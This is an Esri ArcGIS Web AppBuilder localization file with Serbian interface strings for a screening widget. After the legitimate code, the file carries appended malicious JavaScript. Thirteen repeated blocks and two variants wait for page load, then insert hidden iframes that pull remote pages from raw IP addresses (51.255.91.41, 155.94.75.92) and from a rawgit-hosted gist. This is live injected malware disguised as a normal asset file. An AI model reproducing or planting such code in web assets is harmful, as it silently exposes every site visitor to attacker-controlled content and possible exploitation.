// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/nls/strings":{_widgetLabel:"Proveravanje",geometryServicesNotFound:"Servis geometrije nije dostupan.",unableToDrawBuffer:"Crtanje zone bliskosti nije mogu\u0107e. Poku\u0161ajte ponovo.",invalidConfiguration:"Neva\u017ee\u0107a konfiguracija.",clearAOIButtonLabel:"Po\u010dni iz po\u010detka",noGraphicsShapefile:"Otpremljena shapefile datoteka ne sadr\u017ei grafiku.",zoomToLocationTooltipText:"Zumiraj na lokaciju",noGraphicsToZoomMessage:"Nisu prona\u0111ene grafike za zumiranje.",
placenameWidget:{placenameLabel:"Pretra\u017eite lokaciju"},drawToolWidget:{useDrawToolForAOILabel:"Izaberi re\u017eim crtanja",toggleSelectability:"Kliknite da biste uklju\u010dili ili isklju\u010dili mogu\u0107nost selekcije",chooseLayerTitle:"Odaberite selektivan sloj",selectAllLayersText:"Selektuj sve",layerSelectionWarningTooltip:"Makar jedan sloj mora da bude odabran za kreiranje AOI"},shapefileWidget:{shapefileLabel:"Otpremi zipovanu shapefile datoteku",uploadShapefileButtonText:"Otpremi",
unableToUploadShapefileMessage:"Otpremanje shapefile datoteke nije mogu\u0107e."},coordinatesWidget:{selectStartPointFromSearchText:"Defini\u0161ite po\u010detnu ta\u010dku",addButtonTitle:"Dodaj",deleteButtonTitle:"Ukloni",mapTooltipForStartPoint:"Kliknite na mapu kako biste definisali po\u010detnu ta\u010dku",mapTooltipForUpdateStartPoint:"Kliknite na mapu kako biste a\u017eurirali po\u010detnu ta\u010dku",locateText:"Lociraj",locateByMapClickText:"Odaberite po\u010detne koordinate",enterBearingAndDistanceLabel:"Unesite direkcioni ugao i rastojanje od po\u010detne ta\u010dke",
bearingTitle:"Direkcioni ugao",distanceTitle:"Rastojanje",planSettingTooltip:"Postavke plana",invalidLatLongMessage:"Unesite validne vrednosti."},bufferDistanceAndUnit:{bufferInputTitle:"Rastojanje zone bliskosti (opciono)",bufferInputLabel:"Prika\u017ei rezultate unutar"},traverseSettings:{bearingLabel:"Direkcioni ugao",lengthLabel:"Du\u017eina",addButtonTitle:"Dodaj",deleteButtonTitle:"Ukloni"},planSettings:{expandGridTooltipText:"Pro\u0161iri mre\u017eu",collapseGridTooltipText:"Skupi mre\u017eu",
directionUnitLabelText:"Jedinice uputstava",distanceUnitLabelText:"Udaljenost i jedinice du\u017eine",planSettingsComingSoonText:"Sti\u017ee uskoro"},newTraverse:{invalidBearingMessage:"Neva\u017ee\u0107i direkcioni ugao.",invalidLengthMessage:"Neva\u017ee\u0107a du\u017eina.",negativeLengthMessage:"Negativna du\u017eina"},reportsTab:{aoiAreaText:"AOI oblast",downloadButtonTooltip:"Preuzmi",printButtonTooltip:"Od\u0161tampaj",uploadShapefileForAnalysisText:"Otpremite shapefile datoteku za uklju\u010divanje u analizu",
uploadShapefileForButtonText:"Pregledaj",downloadLabelText:"Izaberi format:",downloadBtnText:"Preuzmi",noDetailsAvailableText:"Nema prona\u0111enih rezultata",featureCountText:"Broja\u010d",featureAreaText:"Povr\u0161ina",featureLengthText:"Du\u017eina",attributeChooserTooltip:"Odaberite atribute za prikaz",csv:"CSV",filegdb:"Fajl geobaza",shapefile:"Shapefile datoteka",noFeaturesFound:"Nema prona\u0111enih rezultata za izabrani format datoteke",selectReportFieldTitle:"Izaberite polja",noFieldsSelected:"Nema izabranih polja",
intersectingFeatureExceedsMsgOnCompletion:"Maksimalan broj zapisa je dostignut za jedan ili vi\u0161e slojeva.",unableToAnalyzeText:"Analiza nije mogu\u0107a, maksimalan broj zapisa je dostignut.",errorInPrintingReport:"\u0160tampanje izve\u0161taja nije mogu\u0107e. Proverite da li su postavke izve\u0161taja va\u017ee\u0107e.",aoiInformationTitle:"Informacije o oblasti interesovanja (AOI)",summaryReportTitle:"Rezime",notApplicableText:"Nije dostupno",downloadReportConfirmTitle:"Potvrdi preuzimanje",
downloadReportConfirmMessage:"\u017delite li zaista da preuzmete?",noDataText:"Nema podataka",createReplicaFailedMessage:"Operacija preuzimanje nije uspela za slede\u0107e slojeve: \x3cbr/\x3e ${layerNames}",extractDataTaskFailedMessage:"Operacija preuzimanja nije uspela.",printLayoutLabelText:"Raspored",printBtnText:"Od\u0161tampaj",printDialogHint:"Napomena: naslov izve\u0161taja i komentari mogu da se ure\u0111uju u pregledu izve\u0161taja.",unableToDownloadFileGDBText:"Datoteka geobaze podataka ne mo\u017ee da bude preuzeta za AOI koja sadr\u017ei ta\u010dkaste ili linijske lokacije",
unableToDownloadShapefileText:"Shapefile datoteke ne mo\u017ee da bude preuzeta za AOI koja sadr\u017ei ta\u010dkaste ili linijske lokacije",analysisUnitLabelText:"Prika\u017ei rezultate u:",analysisUnitButtonTooltip:"Odaberite jedinice za analizu",analysisCloseBtnText:"Zatvori",feetUnit:"Stope / kvadratne stope",milesUnit:"Milje / akri",metersUnit:"Metri / kvadratni metri",kilometersUnit:"Kilometri / kvadratni kolometri",hectaresUnit:"Kilometri / hektari",hectaresAbbr:"hektari",layerNotVisibleText:"Analiza nije mogu\u0107a, sloj je isklju\u010den ili je van obuhvata skale vidljivosti.",
refreshBtnTooltip:"Osve\u017ei izve\u0161taj"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});